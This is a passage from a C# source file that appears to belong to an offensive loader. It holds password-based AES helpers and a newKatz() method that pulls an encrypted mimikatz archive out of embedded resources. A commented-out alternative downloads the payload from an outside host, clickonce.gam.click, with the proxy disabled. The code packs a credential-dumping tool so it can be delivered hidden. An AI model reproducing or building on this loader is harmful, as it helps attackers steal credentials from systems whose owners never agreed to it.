            Rijndael rijndael = Rijndael.Create();
            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
            rijndael.Key = pdb.GetBytes(32);
            rijndael.IV = pdb.GetBytes(16);
            memoryStream = new MemoryStream();
            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(plain, 0, plain.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }
        public static byte[] Decrypt(byte[] cipher, string password)
        {
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
            Rijndael rijndael = Rijndael.Create();
            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
            rijndael.Key = pdb.GetBytes(32);
            rijndael.IV = pdb.GetBytes(16);
            memoryStream = new MemoryStream();
            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(cipher, 0, cipher.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }

        public static byte[] ReadFully(Stream input) //Returns Byte Array From Stream 
        {
            byte[] buffer = new byte[16 * 1024];
            using (MemoryStream ms = new MemoryStream())
            {
                int read;
                while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
                {
                    ms.Write(buffer, 0, read);
                }
                return ms.ToArray();
            }
        }


        public static string newKatz()
        {
            //string file;	
            //StringBuilder sb = new StringBuilder();

            string resource_data = System.Text.Encoding.Default.GetString(Properties.Resources.mimikatz_trunk_zip_enc);
            Console.WriteLine("Successfully extract B64 string");

            /*WebClient client = new WebClient();
            client.Proxy = null;

            string DownloadedB64 = client.DownloadString("http://clickonce.gam.click/mimiOneClickDomain/mimikatz_trunk.zip.enc.b64");
            WebClient myWebClient = new WebClient();
            Console.WriteLine("Successfully Downloaded B64 string");

            return DownloadedB64;*/
            return resource_data;
            /*
			file = sb.ToString();
			return file;
            */

        }

    }//End Misc Class	
}
